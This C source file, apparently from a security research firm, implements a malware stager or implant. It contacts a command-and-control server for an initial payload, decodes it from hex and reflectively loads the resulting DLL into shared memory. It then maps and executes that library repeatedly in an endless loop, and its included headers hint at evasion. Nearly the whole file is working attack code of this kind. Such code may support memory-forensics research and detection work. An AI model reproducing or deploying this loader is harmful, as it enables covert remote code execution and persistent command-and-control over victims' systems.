/*
*    Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
*
*       All rights reserved.
*
*       Redistribution and use in source and binary forms, with or without modification,
*       are permitted provided that the following conditions are met:
*
*       * Redistributions of source code must retain the above copyright notice, this
*         list of conditions and the following disclaimer.
*       * Redistributions in binary form must reproduce the above copyright notice,
*         this list of conditions and the following disclaimer in the documentation
*         and/or other materials provided with the distribution.
*       * The names of the contributors may not be used to endorse or promote products
*         derived from this software without specific prior written permission.
*
*       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
*       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
*       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
*       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include "LoadLibraryR.h"
#include "simpleHttp.h"
#include "byte_mod.h"
#include "houdini.h"

#ifdef _DEBUG
	#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d\n", e, GetLastError() ); break; }
#else
	#define BREAK_WITH_ERROR( e ) { break; }
#endif

LPSTR GetInitialPayload(VOID);


int main( int argc, char * argv[] )
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};
	HANDLE sharedMemHandle = NULL;
	ULONG_PTR sharedMemPointer = NULL;
	ULONG_PTR dllEntryPoint = NULL;
	LONG64 dllEntryPointRelOffset = NULL;
	DLLMAIN pDllMain = NULL;

	do
	{
		dwProcessId = GetCurrentProcessId();
		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
		if (!hProcess)
			BREAK_WITH_ERROR("Failed to open the target process");

#ifdef _DEBUG
        printf("Contacting C&C server for initial payload.\n");
#endif
        LPSTR server_response = GetInitialPayload();
        if (server_response == NULL)
            BREAK_WITH_ERROR("Failed to get initial stage.");

        unsigned int length = strlen(server_response);
#ifdef _DEBUG
        printf("Received %d bytes from server.\n", length);
#endif
        lpBuffer = HeapAlloc(GetProcessHeap(), 0, length);
        hex2bin(server_response, (char *)lpBuffer);
        memset(server_response, 0, length);
        dllEntryPoint = LoadLibraryRS(lpBuffer, (length / 2), secret);

		if (dllEntryPoint == NULL)
			BREAK_WITH_ERROR("Failed to prepare shared memory with DLL.");

		// We don't need the buffer anymore
		if (lpBuffer){
			memset(lpBuffer, 0, dwLength);
			HeapFree(GetProcessHeap(), 0, lpBuffer);
		}
		
		HMODULE hResult = NULL;
		pDllMain = (DLLMAIN)(dllEntryPoint);
		if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
			sharedMemPointer = NULL;
		else
			sharedMemPointer = (ULONG_PTR)hResult;

		if (sharedMemPointer == NULL)
			BREAK_WITH_ERROR("Failed to get library base address.");

        //TODO only use entry point once and afterwards a custom function
		dllEntryPointRelOffset = dllEntryPoint - sharedMemPointer;
		if (!pDllMain(NULL, DLL_QUERY_HANDLE, &sharedMemHandle))
			sharedMemHandle = NULL;

		UnmapSharedMemory(hResult);
#ifdef _DEBUG
		printf("received dll entrypoint: %p\n", dllEntryPoint);
		printf("received base address: %p\n", sharedMemPointer);
		printf("relative offset to entry point: %p\n", dllEntryPointRelOffset);
		printf("received sharedmem handle: %p\n", sharedMemHandle);
#endif

		do
		{
			BOOL llResult = MapAndExecuteLibrary(sharedMemHandle, dllEntryPointRelOffset);
			VirtualAlloc(NULL, 0x10000, MEM_RESERVE, 0x40);
#ifdef _DEBUG
			if (llResult)
				printf("[+] Library loaded and executed successfully.\n");
			else
				printf("[-] Something went wrong while loading library and contacting C&C.\n");
#endif
			Sleep(loop_sleep_timeout);
		} while( 1 );

	} while (0);

#ifdef _DEBUG
	printf("Exiting and cleaning up...\n");
#endif
	if( hProcess )
		CloseHandle( hProcess );
	//TODO try/catch which cleans memory
	if (sharedMemHandle)
		CloseHandle(sharedMemHandle);
	return 0;
}
